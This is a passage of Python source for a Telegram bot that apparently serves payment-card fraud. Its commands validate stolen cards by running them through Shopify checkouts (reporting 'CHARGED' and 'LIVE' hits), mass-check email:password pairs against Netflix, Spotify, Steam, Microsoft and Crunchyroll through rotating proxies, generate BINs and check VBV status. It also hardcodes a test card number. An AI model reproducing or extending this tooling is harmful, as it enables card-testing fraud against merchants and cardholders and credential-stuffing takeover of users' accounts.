        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═════════════════════════════╗\n"
            "   🔐 𝗖𝗬𝗕𝗘𝗥𝗦𝗢𝗨𝗥𝗖𝗘 𝗚𝗔𝗧𝗘\n"
            "╚═════════════════════════════╝\n\n"
            "🔴 Status: Coming Soon\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ Under Development\n"
            "🚧 Check back later!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'gate_paypal':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════╗\n"
            "   💰 𝗣𝗔𝗬𝗣𝗔𝗟 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════╝\n\n"
            "🟢 Status: 𝗢𝗻𝗹𝗶𝗻𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /pp - Single check ✅\n"
            "└ /mpp - Mass check (File/Text) ✅\n\n"
            "━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'gate_auth':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   🔐 𝗔𝗨𝗧𝗛 𝗕𝗔𝗦𝗘𝗗 𝗚𝗔𝗧𝗘𝗦\n"
            "╚═══════════════════════╝\n\n"
            "🟢 Status: 𝗢𝗻𝗹𝗶𝗻𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sx - Single check ✅\n"
            "├ /msx - Mass check ✅\n"
            "├ /mssx - Multi-site mass ✅\n"
            "├ /addsx - Add site ✅\n"
            "└ /addpp - Add PayPal site ✅\n\n"
            "━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'account_checker':
        keyboard = [
            [InlineKeyboardButton("Netflix", callback_data='acc_netflix'), InlineKeyboardButton("Spotify", callback_data='acc_spotify')],
            [InlineKeyboardButton("Steam", callback_data='acc_steam'), InlineKeyboardButton("Microsoft", callback_data='acc_microsoft')],
            [InlineKeyboardButton("Crunchyroll", callback_data='acc_crunchyroll'), InlineKeyboardButton("Crunchyroll API", callback_data='acc_crunchyroll_api')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═════════════════════════╗\n"
            "   📊 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════╝\n\n"
            "🟢 Select a service to check accounts\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Available Services:", reply_markup=reply_markup)
    
    elif query.data == 'acc_steam':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🎮 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sta - Single check ✅\n"
            "├ /msta - Mass check (File/Text) ✅\n"
            "├ /psta - Set proxy ✅\n"
            "└ /rpsta - Remove proxy ✅\n\n"
            "📝 Usage:\n"
            "`/sta email:password`\n"
            "`/msta` reply to file\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'acc_netflix':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🎬 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /net - Single check ✅\n"
            "├ /mnet - Mass check (File/Text) ✅\n"
            "├ /pnet - Set proxy (admin) ✅\n"
            "└ /nrp - Remove proxy (admin) ✅\n\n"
            "📝 Usage:\n"
            "`/net email:password`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'acc_spotify':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🎵 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sp - Single check ✅\n"
            "├ /msp - Mass check (File/Text) ✅\n"
            "├ /psp - Set proxy (admin) ✅\n"
            "└ /sprp - Remove proxy (admin) ✅\n\n"
            "📝 Usage:\n"
            "`/sp email:password`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'acc_crunchyroll':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🎬 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /cr - Single check ✅\n"
            "└ /mcr - Mass check (File/Text) ✅\n\n"
            "📝 Usage:\n"
            "`/cr email:password`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'acc_crunchyroll_api':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🍥 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗔𝗣𝗜 𝗕𝗔𝗦𝗘𝗗\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "⚡ Fast & Reliable\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /ca - Single check ✅\n"
            "├ /mca - Mass check (File/Text) ✅\n"
            "├ /pca - Set proxy (admin) ✅\n"
            "└ /rpa - Remove proxy (admin) ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'acc_microsoft':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🔵 𝗠𝗜𝗖𝗥𝗢𝗦𝗢𝗙𝗧 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /ms - Single check ✅\n"
            "├ /mss - Mass check (File/Text) ✅\n"
            "└ /smp - Set proxy (admin) ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'back_main':
        keyboard = [
            [InlineKeyboardButton("👑 Admin Panel", callback_data='admin')],
            [InlineKeyboardButton("🛠 Utility Tools", callback_data='tools'), InlineKeyboardButton("🚪 Payment Gates", callback_data='gates')],
            [InlineKeyboardButton("📊 Account Checkers", callback_data='account_checker')],
            [InlineKeyboardButton("💳 Card Checkers", callback_data='card_gates')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = (
            "╔══════════════════════════╗\n"
            "     ⚡ 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗠𝗘𝗡𝗨 ⚡\n"
            "╚══════════════════════════╝\n\n"
            "🟢 Status: 𝗢𝗻𝗹𝗶𝗻𝗲\n"
            "🌐 Version: 𝘃𝟮.𝟬 (𝗨𝗽𝗱𝗮𝘁𝗲𝗱)\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 𝗤𝘂𝗶𝗰𝗸 𝗔𝗰𝗰𝗲𝘀𝘀:\n"
            "├ /start - Launch bot ✅\n"
            "├ /register - Sign up ✅\n"
            "└ /cmd - Commands menu ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "👇 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗲𝘅𝗽𝗹𝗼𝗿𝗲:"
        )
        
        await safe_edit_message(query, message, reply_markup=reply_markup)

from shopify_auto_checkout import ShopifyAuto

# Shopify Auto Integration
SHOPIFY_AUTO_FILE = 'gates/shopify/bot_settings.json'

def load_shopify_settings():
    try:
        if os.path.exists(SHOPIFY_AUTO_FILE):
            with open(SHOPIFY_AUTO_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {"settings": {"url": "", "proxies": [], "proxy_index": 0, "sites": []}, "admin_ids": [6124719858]}

def save_shopify_settings(settings):
    with open(SHOPIFY_AUTO_FILE, 'w') as f:
        json.dump(settings, f, indent=2)

async def sx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please /register first.")
        return

    args = context.args
    cc_data = ""
    if update.message.reply_to_message and update.message.reply_to_message.text:
        cc_data = update.message.reply_to_message.text
    elif args:
        cc_data = " ".join(args)
    else:
        await update.message.reply_text("❌ Usage: /sx <cc> or reply to a CC")
        return

    cc_pattern = r'(\d{15,16})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})'
    match = re.search(cc_pattern, cc_data)
    if not match:
        await update.message.reply_text("❌ Invalid CC format.")
        return
    
    card = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    bin_num = match.group(1)[:6]
    bin_info = await get_bin_info(bin_num)
    
    settings = load_shopify_settings()
    sites = settings['settings'].get('sites', [])
    if not sites:
        await update.message.reply_text("❌ No Shopify sites available. Contact admin.")
        return
    
    proxies = settings['settings'].get('proxies', [])
    proxy = random.choice(proxies) if proxies else None
    
    status_text = (
        "み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
        "𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔄 𝑹𝒆𝒕𝒓𝒊𝒆𝒔: 0\n"
        "🌐 𝑷𝒓𝒐𝒙𝒚: " + ("✅ Alive" if proxy else "❌ No Proxy") + "\n"
        "💳 𝑪𝒂𝒓𝒅: `" + card + "`\n"
        "📌 𝑹𝒆𝒔𝒖𝒍𝒕: 🔄 Processing...\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    msg = await update.message.reply_text(status_text, parse_mode='Markdown')
    
    shopify = ShopifyAuto()
    success = False
    retries = 0
    start_time = time.time()
    
    random.shuffle(sites)
    dead_responses = [
        "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",
        "DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION",
        "REQUIRED_ARTIFACTS_UNAVAILABLE",
        "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
        "DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED",
        "TAX_NEW_TAX_MUST_BE_ACCEPTED",
        "MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION",
        "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE"
    ]
    
    for site in sites[:5]:
        try:
            result = await shopify.auto_shopify_charge(site, card, proxy)
            elapsed = round(time.time() - start_time, 2)
            
            # Check for dead site responses
            is_dead = any(dr in result for dr in dead_responses)
            if is_dead:
                # Remove from current session sites to avoid retrying
                if site in sites:
                    sites.remove(site)
                continue

            if "✅" in result or "APPROVED" in result.upper() or "CHARGED" in result.upper() or "LIVE" in result.upper():
                final_res = (
                    "み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
                    "𝗦𝗛𝗢𝗣𝗜𝗙𝗬 0.25$\n"
                    "━━━━━━━━━\n"
                    f"𝐂𝐂 ➜ `{card}`\n"
                    "𝐒𝐓𝐀𝐓𝐔𝐒 ➜ APPROVED ✅\n"
                    f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}\n"
                    "𝑽𝑩𝑽 ➜ N/A\n"
                    "𝐫𝐞𝐚𝐬𝐨𝐧/𝐭𝐲𝐩𝐞 ➜ N/A\n"
                    "━━━━━━━━━\n"
                    f"𝐁𝐈𝐍 ➜ {bin_num}\n"
                    f"𝐓𝐘𝐏𝐄 ➜ {bin_info.get('type', 'N/A')}\n"
                    f"𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country', 'N/A')}\n"
                    f"𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}\n"
                    "━━━━━━━━━\n"
                    f"𝗧/𝘁 : {elapsed}s | 𝐏𝐫𝐨𝐱𝐲 : " + ("✅ Alive" if proxy else "No Proxy") + "\n"
                    f"𝐑𝐄 : @{update.effective_user.username or 'N/A'}\n"
                    "𝐃𝐄𝗩 : @MUMIRU"
                )
                await msg.edit_text(final_res, parse_mode='Markdown')
                success = True
                break
            elif "❌" in result or "Declined" in result:
                retries += 1
                continue
        except Exception as e:
            retries += 1
            continue
            
    if not success:
        await msg.edit_text(f"❌ Card Declined or Error after {retries} retries.")

async def msx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please /register first.")
        return

    cards = []
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        cc_data = content.decode('utf-8')
    elif context.args:
        cc_data = " ".join(context.args)
    else:
        await update.message.reply_text("❌ Usage: /msx <cc_list> or reply to a file.")
        return

    cc_pattern = r'(\d{15,16})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})'
    cards = re.findall(cc_pattern, cc_data)
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return

    settings = load_shopify_settings()
    sites = settings['settings'].get('sites', [])
    if not sites:
        await update.message.reply_text("❌ No Shopify sites available.")
        return
        
    msg = await update.message.reply_text(f"🔄 Mass Checking {len(cards)} cards...")
    
    shopify = ShopifyAuto()
    hits = 0
    lives = 0
    dead = 0
    errors = 0
    
    for i, (cc, mm, yy, cv) in enumerate(cards):
        card = f"{cc}|{mm}|{yy}|{cv}"
        random.shuffle(sites)
        proxy = random.choice(settings['settings'].get('proxies', [])) if settings['settings'].get('proxies') else None
        
        # Update progress in a professional format
        progress = (i + 1) / len(cards) * 100
        bar = "█" * int(progress / 10) + "░" * (10 - int(progress / 10))
        
        stats_text = (
            "⚡💠 𝑺𝒕𝒂𝒕𝒖𝒔: 🔄 Checking...\n"
            "━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━\n"
            f"📊 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {i+1}/{len(cards)} [{bar}] {progress:.1f}%\n"
            f"✅ 𝑯𝒊𝒕𝒔: {hits} | ❎ 𝑳𝒊𝒗𝒆: {lives}\n"
            f"❌ 𝑫𝒆𝒂𝒅: {dead} | ⚠️ 𝑬𝒓𝒓𝒐𝒓𝒔: {errors}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━"
        )
        try:
            if i % 5 == 0: await msg.edit_text(stats_text)
            
            res = await shopify.auto_shopify_charge(sites[0], card, proxy)
            if "CHARGED" in res.upper():
                hits += 1
                # Send hit instantly
                await update.message.reply_text(f"💰 CHARGED: {card}\nResponse: {res}")
            elif "LIVE" in res.upper() or "APPROVED" in res.upper():
                lives += 1
                await update.message.reply_text(f"✅ LIVE: {card}\nResponse: {res}")
            else:
                dead += 1
        except:
            errors += 1
            
    await msg.edit_text(f"✅ Completed: Hits: {hits}, Lives: {lives}, Dead: {dead}, Errors: {errors}")

async def mssx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    args = context.args
    links = []
    
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        links = content.decode('utf-8').splitlines()
    elif args:
        links = args
    else:
        await update.message.reply_text("❌ Usage: /mssx <url> or reply to a file with URLs")
        return

    msg = await update.message.reply_text(f"🔍 Checking {len(links)} sites for Shopify...")
    
    shopify = ShopifyAuto()
    working_sites = []
    dead_sites = []
    test_cc = "4520340107950985|09|2029|911"
    
    for url in links:
        url = url.strip()
        if not url.startswith('http'): url = 'https://' + url
        try:
            # Use auto_shopify_charge as a probe
            result = await shopify.auto_shopify_charge(url, test_cc)
            if "❌" not in result or "Declined" in result:
                working_sites.append(url)
            else:
                dead_sites.append(url)
        except:
            dead_sites.append(url)
            
    # Send results as files as requested
    working_content = "\n".join(working_sites)
    dead_content = "\n".join(dead_sites)
    
    with open("working_shopify.txt", "w") as f: f.write(working_content)
    with open("dead_shopify.txt", "w") as f: f.write(dead_content)
    
    await update.message.reply_document(document=open("working_shopify.txt", "rb"), caption="✅ Working Shopify Sites")
    await update.message.reply_document(document=open("dead_shopify.txt", "rb"), caption="❌ Non-Shopify or Error Sites")

async def addsx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    links = []
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        links = content.decode('utf-8').splitlines()
    elif context.args:
        links = context.args
    
    if not links:
        await update.message.reply_text("❌ Provide links or reply to a file.")
        return
        
    settings = load_shopify_settings()
    current_sites = settings['settings'].get('sites', [])
    new_sites = list(set(current_sites + [l.strip() for l in links if l.strip()]))
    settings['settings']['sites'] = new_sites
    save_shopify_settings(settings)
    
    await update.message.reply_text(f"✅ Added {len(new_sites) - len(current_sites)} new sites to rotation. Total: {len(new_sites)}")

async def addpp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    proxies = []
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        proxies = content.decode('utf-8').splitlines()
    elif context.args:
        proxies = context.args
        
    if not proxies:
        await update.message.reply_text("❌ Provide proxies or reply to a file.")
        return
        
    settings = load_shopify_settings()
    current_proxies = settings['settings'].get('proxies', [])
    new_proxies = list(set(current_proxies + [p.strip() for p in proxies if p.strip()]))
    settings['settings']['proxies'] = new_proxies
    save_shopify_settings(settings)
    
    await update.message.reply_text(f"✅ Added {len(new_proxies) - len(current_proxies)} proxies. Total: {len(new_proxies)}")

async def bin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /bin <BIN>\n"
            "Example: /bin 471536"
        )
        return
    
    bin_number = context.args[0][:6]
    
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            message = (
                f"╔═════════════════════════╗\n"
                f"   ✅ 𝗕𝗜𝗡 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
                f"╚═════════════════════════╝\n\n"
                f"🔢 BIN: `{data.get('bin', 'N/A')}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💳 Brand: {data.get('brand', 'N/A')}\n"
                f"🌍 Country: {data.get('country_name', 'N/A')} {data.get('country_flag', '')}\n"
                f"🏦 Bank: {data.get('bank', 'N/A')}\n"
                f"📊 Level: {data.get('level', 'N/A')}\n"
                f"🔖 Type: {data.get('type', 'N/A')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            await update.message.reply_text(message)
        else:
            await update.message.reply_text("❌ BIN not found or invalid.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def mbin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mbin <BIN1> <BIN2> ...\n"
            "Example: /mbin 471536 440066"
        )
        return
    
    bins = context.args[:10]
    results = []
    
    for bin_number in bins:
        bin_number = bin_number[:6]
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                results.append(
                    f"✅ {data.get('bin', 'N/A')} - {data.get('brand', 'N/A')} - {data.get('country_name', 'N/A')} {data.get('country_flag', '')}"
                )
            else:
                results.append(f"❌ {bin_number} - Not found")
        except:
            results.append(f"❌ {bin_number} - Error")
    
    await update.message.reply_text(
        "╔════════════════════════╗\n"
        "   🔍 𝗠𝗔𝗦𝗦 𝗕𝗜𝗡 𝗖𝗛𝗘𝗖𝗞\n"
        "╚════════════════════════╝\n\n"
        + "\n".join(results) +
        "\n\n━━━━━━━━━━━━━━━━━━━━━"
    )

async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check VBV status for a card"""
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /vbv <card|mm|yy|cvv>\n"
            "Example: /vbv 4532123456789012|12|25|123"
        )
        return
    
    import time
    start_time = time.time()
    
    card_input = context.args[0]
    parts = card_input.split('|')
    
    if len(parts) < 1:
        await update.message.reply_text("❌ Invalid card format!")
        return
    
    card_number = parts[0]
    if not (card_number.isdigit() and 13 <= len(card_number) <= 19):
        await update.message.reply_text("❌ Invalid card number!")
        return
    
    try:
        vbv_info = await get_vbv_info(card_number)
        
        bin_number = card_number[:6]
        bin_response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        bin_info = bin_response.json() if bin_response.status_code == 200 else {}
        
        time_taken = time.time() - start_time
        requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
        
        masked_card = f"{card_number[:6]}******{card_number[-4:]}"
        if len(parts) >= 4:
            masked_card = f"{card_number[:6]}******{card_number[-4:]}|{parts[1]}|{parts[2]}|{parts[3]}"
        
        response = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝑽𝑩𝑽
━━━━━━━━━
𝐂𝐂 ➜ <code>{html.escape(masked_card)}</code>
𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_info.get('brand', 'N/A')} {bin_info.get('type', 'N/A')}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}
𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
━━━━━━━━━
𝗧/𝘁 : {time_taken:.2f}s
𝐑𝐄𝐐 : @{requester_username}
𝐃𝐄𝐕 : @MUMIRU"""
        
        await update.message.reply_text(response, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def gbin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return ConversationHandler.END
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /gbin <quantity>\n"
            "Example: /gbin 10"
        )
        return ConversationHandler.END
    
    try:
        quantity = int(context.args[0])
        if quantity < 1 or quantity > 50:
            await update.message.reply_text("❌ Please enter a quantity between 1 and 50")
            return ConversationHandler.END
        
        context.user_data['gbin_quantity'] = quantity
        
        await update.message.reply_text(
            "Which BIN type do you want?\n\n"
            "1. Visa 💳\n"
            "2. Mastercard 💳\n"
            "3. American Express 💳\n"
            "4. Discover 💳\n\n"
            "Reply with the number (1-4):"
        )
        return GBIN_WAITING_TYPE
        
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number")
        return ConversationHandler.END

async def gbin_receive_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    
    bin_types = {
        '1': ('Visa', ['4']),
        '2': ('Mastercard', ['51', '52', '53', '54', '55', '22', '23', '24', '25', '26', '27']),
        '3': ('American Express', ['34', '37']),
        '4': ('Discover', ['6011', '65'])
    }
    
    if user_input not in bin_types:
        await update.message.reply_text("❌ Please enter a number between 1-4")
        return GBIN_WAITING_TYPE
    
    context.user_data['gbin_type_name'] = bin_types[user_input][0]
    context.user_data['gbin_prefixes'] = bin_types[user_input][1]
    
    await update.message.reply_text(
        "How many digits do you need in the BIN? (5 or 6)"
    )
    return GBIN_WAITING_DIGITS

async def gbin_receive_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import random
    
    user_input = update.message.text.strip()
    
    if user_input not in ['5', '6']:
        await update.message.reply_text("❌ Please enter either 5 or 6")
        return GBIN_WAITING_DIGITS
    
    digit_count = int(user_input)
    quantity = context.user_data.get('gbin_quantity', 10)
    type_name = context.user_data.get('gbin_type_name', 'Unknown')
    prefixes = context.user_data.get('gbin_prefixes', ['4'])
    
    bins = []
    for _ in range(quantity):
        prefix = random.choice(prefixes)
        remaining_digits = digit_count - len(prefix)
        random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits)])
        bin_number = prefix + random_part
        bins.append(bin_number)
    
    bins_formatted = "\n".join([f"`{b}`" for b in bins])
    result = (
        f"╔═════════════════════════╗\n"
        f"   🎲 𝗕𝗜𝗡 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥\n"
        f"╚═════════════════════════╝\n\n"
        f"💳 Type: {type_name}\n"
        f"🔢 Digits: {digit_count}\n"
        f"📊 Quantity: {quantity}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        + bins_formatted +
        "\n\n━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(result, parse_mode='Markdown')
    
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_gbin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ BIN generation cancelled.")
    context.user_data.clear()
    return ConversationHandler.END

def parse_card(card_string):
    patterns = [
        r'(\d{15,16})[|/\s:]+(\d{1,2})[|/\s:]+(\d{2,4})[|/\s:]+(\d{3,4})',
        r'(\d{15,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            return {
                'number': match.group(1),
                'month': match.group(2).zfill(2),
                'year': match.group(3) if len(match.group(3)) == 4 else '20' + match.group(3),
                'cvv': match.group(4)
            }
    return None

def luhn_checksum(card_number):
    """Calculate Luhn checksum for card validation"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def detect_card_type(bin_str):
    """Detect card type from BIN and return (type, length, cvv_length)"""
    bin_2 = bin_str[:2]
    bin_3 = bin_str[:3]
    bin_4 = bin_str[:4]
    
    try:
        bin_num = int(bin_str[:4]) if len(bin_str) >= 4 else int(bin_str)
    except:
        bin_num = 0
    
    if bin_2 in ('34', '37'):
        return ('Amex', 15, 4)
    elif bin_str.startswith('4'):
        return ('Visa', 16, 3)
    elif bin_2 in ('51', '52', '53', '54', '55'):
        return ('Mastercard', 16, 3)
    elif bin_num >= 2221 and bin_num <= 2720:
        return ('Mastercard', 16, 3)
    elif bin_4 == '6011' or bin_2 == '65' or (bin_num >= 6440 and bin_num <= 6499):
        return ('Discover', 16, 3)
    elif bin_2 in ('62', '81'):
        return ('UnionPay', 16, 3)
    elif bin_2 == '35' or bin_4 in ('2131', '1800'):
        return ('JCB', 16, 3)
    elif bin_3 in ('300', '301', '302', '303', '304', '305', '309') or bin_2 in ('36', '38', '39'):
        return ('Diners Club', 14, 3)
